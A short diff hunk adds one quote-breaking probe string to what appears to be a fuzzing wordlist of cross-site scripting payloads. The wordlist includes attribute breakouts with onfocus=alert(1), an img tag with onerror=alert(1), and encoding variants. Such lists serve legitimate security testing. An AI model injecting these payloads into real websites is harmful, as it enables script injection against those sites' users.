@@ -13,6 +13,7 @@
 %ff%fe
 \u0027
 &bsol;
+<s>ElectricYellow'"
 " tabindex=1 onfocus=alert(1) x="
 \"-alert(1)}//
 "><img/src=ElectricYellow onerror=alert(1)>
